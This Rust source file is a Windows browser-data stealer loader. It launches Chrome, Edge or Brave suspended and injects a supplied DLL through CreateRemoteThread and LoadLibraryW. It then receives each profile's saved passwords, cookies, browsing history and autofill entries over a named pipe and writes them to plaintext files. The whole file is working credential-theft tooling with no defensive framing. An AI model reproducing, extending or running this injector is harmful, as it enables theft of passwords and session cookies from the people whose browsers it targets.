use clap::Parser;
use serde::{Deserialize, Serialize};
use std::ffi::OsStr;
use std::fs;
use std::io::{Read, Write};
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use std::ptr;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::LibraryLoader::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Pipes::*;
use windows_sys::Win32::System::Threading::*;

#[derive(Serialize, Deserialize, Debug)]
struct PasswordData {
    url: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct CookieData {
    host: String,
    name: String,
    value: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct HistoryData {
    url: String,
    title: String,
    visit_count: i32,
}

#[derive(Serialize, Deserialize, Debug)]
struct AutofillData {
    name: String,
    value: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct ProfileData {
    name: String,
    passwords: Vec<PasswordData>,
    cookies: Vec<CookieData>,
    history: Vec<HistoryData>,
    autofill: Vec<AutofillData>,
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Path to the DLL to inject
    #[arg(short, long)]
    dll: String,

    /// Target browser (chrome, edge, brave, all)
    #[arg(short, long, default_value = "all")]
    browser: String,
}

struct BrowserConfig {
    name: &'static str,
    exe_name: &'static str,
    common_paths: &'static [&'static str],
}

const BROWSERS: &[BrowserConfig] = &[
    BrowserConfig {
        name: "Chrome",
        exe_name: "chrome.exe",
        common_paths: &[
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ],
    },
    BrowserConfig {
        name: "Edge",
        exe_name: "msedge.exe",
        common_paths: &[
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
    },
    BrowserConfig {
        name: "Brave",
        exe_name: "brave.exe",
        common_paths: &[
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
    },
];

fn find_browser_exe(name: &str) -> Option<String> {
    let config = BROWSERS.iter().find(|b| b.name.to_lowercase() == name.to_lowercase())?;
    for path in config.common_paths {
        if std::path::Path::new(path).exists() {
            return Some(path.to_string());
        }
    }
    None
}

fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig) {
    println!("\n--- Processing Browser: {} ---", browser_config.name);

    let mut cmd_line: Vec<u16> = OsStr::new(browser_config.exe_name).encode_wide().chain(Some(0)).collect();

    unsafe {
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let success = CreateProcessW(
            ptr::null(),
            cmd_line.as_mut_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null(),
            &mut startup_info,
            &mut process_info,
        );

        if success == 0 {
            if let Some(path) = find_browser_exe(browser_config.name) {
                let full_path_wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(Some(0)).collect();
                let mut cmd_full = full_path_wide.clone();
                let success2 = CreateProcessW(
                    full_path_wide.as_ptr(),
                    cmd_full.as_mut_ptr(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    CREATE_SUSPENDED,
                    ptr::null_mut(),
                    ptr::null(),
                    &mut startup_info,
                    &mut process_info,
                );
                if success2 == 0 {
                    eprintln!("Failed to create {} process: {}", browser_config.exe_name, GetLastError());
                    return;
                }
            } else {
                eprintln!("{} not found.", browser_config.exe_name);
                return;
            }
        }

        let process_handle = process_info.hProcess;
        let thread_handle = process_info.hThread;
        println!("Created {} with PID: {}", browser_config.exe_name, process_info.dwProcessId);

        let remote_mem = VirtualAllocEx(process_handle, ptr::null(), dll_path_u16.len() * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote_mem.is_null() {
            eprintln!("Failed to allocate memory: {}", GetLastError());
            CloseHandle(process_handle); CloseHandle(thread_handle); return;
        }

        if WriteProcessMemory(process_handle, remote_mem, dll_path_u16.as_ptr() as *const _, dll_path_u16.len() * 2, ptr::null_mut()) == 0 {
            eprintln!("Failed to write memory: {}", GetLastError());
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE); CloseHandle(process_handle); CloseHandle(thread_handle); return;
        }

        let kernel32_name: Vec<u16> = OsStr::new("kernel32.dll").encode_wide().chain(Some(0)).collect();
        let kernel32_handle = GetModuleHandleW(kernel32_name.as_ptr());
        let load_library_addr = GetProcAddress(kernel32_handle, b"LoadLibraryW\0".as_ptr());

        let remote_thread = CreateRemoteThread(process_handle, ptr::null(), 0, Some(std::mem::transmute(load_library_addr)), remote_mem, 0, ptr::null_mut());
        if remote_thread == 0 {
            eprintln!("Failed to create remote thread: {}", GetLastError());
            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE); CloseHandle(process_handle); CloseHandle(thread_handle); return;
        }

        WaitForSingleObject(remote_thread, INFINITE);
        CloseHandle(remote_thread);
        VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);

        if ResumeThread(thread_handle) == u32::MAX {
            eprintln!("Failed to resume thread: {}", GetLastError());
        }

        let pipe_name: Vec<u16> = OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
        let pipe_handle = CreateNamedPipeW(pipe_name.as_ptr(), PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, ptr::null());

        if pipe_handle != INVALID_HANDLE_VALUE {
            println!("Waiting for DLL connection...");
            if ConnectNamedPipe(pipe_handle, ptr::null_mut()) != 0 || GetLastError() == ERROR_PIPE_CONNECTED {
                let mut buffer = Vec::new();
                let mut temp_buffer = [0u8; 8192];
                loop {
                    let mut bytes_read: u32 = 0;
                    let success = ReadFile(pipe_handle, temp_buffer.as_mut_ptr() as *mut _, temp_buffer.len() as u32, &mut bytes_read, ptr::null_mut());
                    if (success != 0 || GetLastError() == ERROR_MORE_DATA) && bytes_read > 0 {
                        buffer.extend_from_slice(&temp_buffer[..bytes_read as usize]);
                        if success != 0 { break; }
                    } else { break; }
                }

                if !buffer.is_empty() {
                    if let Ok(profiles) = serde_json::from_slice::<Vec<ProfileData>>(&buffer) {
                        let browser_dir = Path::new(browser_config.name);
                        let _ = fs::create_dir_all(browser_dir);
                        for (i, profile) in profiles.into_iter().enumerate() {
                            let folder_name = format!("profile {}", i + 1);
                            let profile_dir = browser_dir.join(&folder_name);
                            let _ = fs::create_dir_all(&profile_dir);

                            if let Ok(mut f) = fs::File::create(profile_dir.join("password.txt")) {
                                for p in profile.passwords { let _ = writeln!(f, "URL: {}\nUser: {}\nPass: {}\n", p.url, p.username, p.password); }
                            }
                            if let Ok(mut f) = fs::File::create(profile_dir.join("cookie.txt")) {
                                for c in profile.cookies { let _ = writeln!(f, "Host: {} | Name: {} | Value: {}", c.host, c.name, c.value); }
                            }
                            if let Ok(mut f) = fs::File::create(profile_dir.join("history.txt")) {
                                for h in profile.history { let _ = writeln!(f, "URL: {} | Title: {} | Visits: {}", h.url, h.title, h.visit_count); }
                            }
                            if let Ok(mut f) = fs::File::create(profile_dir.join("autofill.txt")) {
                                for a in profile.autofill { let _ = writeln!(f, "Name: {} | Value: {}", a.name, a.value); }
                            }
                            println!("Saved {} profile: {} as {}/{}", browser_config.name, profile.name, browser_config.name, folder_name);
                        }
                    }
                }
            }
            CloseHandle(pipe_handle);
        }

        // Kill process after collection
        let _ = TerminateProcess(process_handle, 0);
        CloseHandle(process_handle);
        CloseHandle(thread_handle);
    }
}

fn main() {
    let args = Args::parse();
    let dll_path = std::path::Path::new(&args.dll).canonicalize().expect("DLL path error");
    let dll_path_u16: Vec<u16> = dll_path.as_os_str().encode_wide().chain(Some(0)).collect();

    if args.browser.to_lowercase() == "all" {
        for config in BROWSERS {
            inject_and_collect(&dll_path_u16, config);
        }
    } else {
        if let Some(config) = BROWSERS.iter().find(|b| b.name.to_lowercase() == args.browser.to_lowercase()) {
            inject_and_collect(&dll_path_u16, config);
        } else {
            eprintln!("Unsupported browser: {}", args.browser);
        }
    }
}
